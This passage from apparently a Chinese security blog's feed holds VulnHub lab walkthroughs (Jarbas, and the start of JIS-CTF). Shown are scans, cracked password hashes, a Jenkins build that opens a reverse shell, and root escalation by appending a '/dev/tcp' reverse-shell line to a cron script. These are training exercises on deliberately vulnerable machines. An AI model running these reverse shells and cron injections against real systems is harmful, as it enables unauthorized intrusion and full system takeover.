class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,3306,8080 192.168.2.3 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 09:14 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.3<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-trace: TRACE is enabled<br>| http-enum: <br>|_  /icons/: Potentially interesting folder w/ directory listing<br>| http-sql-injection: <br>|   Possible sqli <span class="hljs-keyword">for</span> queries:<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider<br>|     http://192.168.2.3:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider<br>|_    http://192.168.2.3:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.3<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: wmtb<br>|     Form action: /web/submit<br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php<br>|     <br>|     Path: http://192.168.2.3:80/<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>| http-enum: <br>|_  /robots.txt: Robots file<br>MAC Address: 08:00:27:42:06:E4 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 41.49 seconds<br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）使用<code>gobuster</code>进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.3 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.3<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 32808]<br>/.html                (Status: 403) [Size: 207]<br>/access.html          (Status: 200) [Size: 359]<br>/.html                (Status: 403) [Size: 207]<br>Progress: 622929 / 622932 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（2）访问<code>access.html</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052234539.png"><br>（3）得到相关的md5值，对MD5进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">5978a63b4654c73c60fa24f836386d87 italia99<br>f463f63616cb3f1e81ce46b39f882fd5 marianna<br>9b38e2b1e8b12f426b0d208a7ab6cb98 vipsu<br></code></pre></td></tr></table></figure><h2 id="8080端口渗透"><a href="#8080端口渗透" class="headerlink" title="8080端口渗透"></a>8080端口渗透</h2><p>（1）访问8080端口，发现是一个登录界面，同时暴露出<code>CMS</code>是<code>Jenkins</code><br>首要思路就是如何找到这个登录界面的账号和密码，寻找用户名和密码有如下几个思路：</p><ol><li>尝试默认登录，Jenkins是常见cms，可能存在默认密码</li><li>尝试弱口令爆破</li><li>尝试渗透寻找相关密码<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052240069.png"><br>（2）最后尝试<code>eder:vipsu</code>成功进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052241658.png"><br> 发现该系统的框架是<code>Jenkins</code><br>（3）构建新项目，并执行反弹shell<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502052319940.png"><br>成功获取到shell，权限为jenkins<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Jarbas]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvvp 4444                                              <br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.3] 37256<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-4.2$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=997(jenkins) gid=995(jenkins) <span class="hljs-built_in">groups</span>=995(jenkins) context=system_u:system_r:initrc_t:s0<br></code></pre></td></tr></table></figure></li></ol><h1 id="提权-crontab"><a href="#提权-crontab" class="headerlink" title="提权-crontab"></a>提权-crontab</h1><p>（1）查看<code>sudo -l</code>，没有发现有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span> -l<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br><span class="hljs-built_in">sudo</span>: no <span class="hljs-built_in">tty</span> present and no askpass program specified<br></code></pre></td></tr></table></figure><p>（2）查看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br>SHELL=/bin/bash<br>PATH=/sbin:/bin:/usr/sbin:/usr/bin<br>MAILTO=root<br><br><span class="hljs-comment"># For details see man 4 crontabs</span><br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name  command to be executed</span><br>*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>发现一个定时任务脚本<code>CleaningScript.sh</code>是以<code>root</code>权限每隔5分钟执行一次<br>（3）查看脚本内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh<br><span class="hljs-built_in">cat</span> /etc/script/CleaningScript.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-built_in">rm</span> -rf /var/log/httpd/access_log.txt<br></code></pre></td></tr></table></figure><p>（4）向脚本里面追加反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.2$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.4/5555 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/script/CleaningScript.sh<br>&lt;i &gt;&amp; /dev/tcp/192.168.2.4/5555 0&gt;&amp;1<span class="hljs-string">&quot; &gt;&gt; /etc/script/CleaningScript.sh </span><br></code></pre></td></tr></table></figure><p>（5）开启监听，最后成功进行提权，获得root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">sudo</span> nc -lvnp 5555<br>[<span class="hljs-built_in">sudo</span>] kali 的密码：<br>listening on [any] 5555 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.3] 34124<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>[root@jarbas ~]# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023<br></code></pre></td></tr></table></figure><p><strong>读取flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@jarbas ~]# <span class="hljs-built_in">cat</span> /root/flag.txt<br><span class="hljs-built_in">cat</span> /root/flag.txt<br>Hey!<br><br>Congratulations! You got it! I always knew you could <span class="hljs-keyword">do</span> it!<br>This challenge was very easy, huh? =)<br><br>Thanks <span class="hljs-keyword">for</span> appreciating this machine.<br><br>@tiagotvrs <br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）jenkins渗透，可以新建项目，在项目里面构建执行shell脚本，最后执行build，即可成功进行通信。<br>（2）crontab提权</p><ul><li>文件权限提权，向crontab脚本中追加shell<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权-crontab</tag>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIS-CTF-VULNUPLOAD</title>
    <link href="/Vulnhub/JIS-CTF-VULNUPLOAD/"/>
    <url>/Vulnhub/JIS-CTF-VULNUPLOAD/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/">https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24                                    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:15 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00012s latency).                              <br>MAC Address: 0A:00:27:00:00:0A (Unknown)                            <br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2                                  <br>Host is up (0.00020s latency).                                <br>MAC Address: 08:00:27:5B:20:82 (Oracle VirtualBox virtual NIC)      Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5                                   <br>Host is up (0.00050s latency).                                      MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)      Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4   Host is up.                                              <br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.03 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.2.5 -oA nmapscan/ports                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:19 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.0061s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.69 seconds<br></code></pre></td></tr></table></figure><p>（2）对端口细节进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p 22,80 192.168.2.5 -oA nmapscan/detail <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:20 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00079s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.80 seconds<br></code></pre></td></tr></table></figure><p>（3）对端口进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80 192.168.2.5 -oA nmapscan/udp             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:21 EST<br>Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan<br>Parallel DNS resolution of 1 host. Timing: About 0.00% <span class="hljs-keyword">done</span><br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00072s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.20 seconds<br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.5 -oA nmapscan/vuln          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 04:24 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.5<br>Host is up (0.00094s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.5</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.5:80/</span><br><span class="hljs-string">|     Form id: </span><br><span class="hljs-string">|_    Form action: check_login.php</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /admin_area/: Possible admin folder</span><br><span class="hljs-string">|   /login.php: Possible admin folder</span><br><span class="hljs-string">|   /admin_area/index.php: Possible admin folder</span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.18 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:54:5C:4F (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 334.73 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，发现是一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502061734755.png"></p><p>（2）使用<code>gobuster</code>进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/JIS-CTF]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.5<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              html,php,txt<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 302) [Size: 1228] [--&gt; login.php]<br>/.php                 (Status: 403) [Size: 290]<br>/.html                (Status: 403) [Size: 291]<br>/login.php            (Status: 200) [Size: 1485]<br>/assets               (Status: 301) [Size: 311] [--&gt; http://192.168.2.5/assets/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://192.168.2.5/css/]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://192.168.2.5/js/]<br>/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]<br>/flag                 (Status: 301) [Size: 309] [--&gt; http://192.168.2.5/flag/]<br>/flag.txt             (Status: 403) [Size: 294]<br>/robots.txt           (Status: 200) [Size: 160]<br>/.php                 (Status: 403) [Size: 290]<br>/.html                (Status: 403) [Size: 291]<br>/uploaded_files       (Status: 301) [Size: 319] [--&gt; http://192.168.2.5/uploaded_files/]                                                                          <br>/hint.txt             (Status: 200) [Size: 145]<br>/server-status        (Status: 403) [Size: 299]<br>Progress: 830572 / 830576 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（3）尝试访问<code>flag</code>文件，找到第一个flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">The 1st flag is : &#123;8734509128730458630012095&#125;<br></code></pre></td></tr></table></figure><p>（4）尝试访问<code>robots.txt</code>文件，找到以下的路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-agent: *<br>Disallow: /<br>Disallow: /backup<br>Disallow: /admin<br>Disallow: /admin_area<br>Disallow: /r00t<br>Disallow: /uploads<br>Disallow: /uploaded_files<br>Disallow: /flag<br></code></pre></td></tr></table></figure><ul><li>依次对路径进行访问，发现<code>admin_area</code>可以进行访问，查看页面源码，找到第二个flag</li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">Fake admin area :)</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>The admin area not work :) <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!--username : admin</span></span><br><span class="hljs-comment"><span class="language-xml">password : 3v1l_H@ck3r</span></span><br><span class="hljs-comment"><span class="language-xml">The 2nd flag is : </span></span><span class="hljs-template-variable">&#123;7412574125871236547895214&#125;</span><span class="language-xml"><span 